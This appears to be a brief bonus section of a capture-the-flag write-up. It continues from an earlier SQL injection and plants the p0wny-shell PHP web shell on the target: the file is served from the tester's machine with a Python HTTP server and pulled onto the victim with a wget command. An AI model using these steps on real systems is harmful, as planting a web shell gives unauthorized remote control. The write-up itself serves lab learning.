# bonus - p0wny-shell

We continue from the point in Writeup 1 where the SQL injection is performed. We download a single-file PHP shell ([p0wny-shell](https://github.com/flozz/p0wny-shell)) and start a Python server on our pentesting VM:
``` shell
python3 -m http.server 8080
```

Next, we download the `.php` file using the SQL command injection:
``` shell
wget http://IP:8080/p0wny.php
```

Then we just access the shell in the `/forum/templates_c` subdirectory. From there, we proceed with the standard enumeration as outlined in Writeup 1—home, lookatme, password.
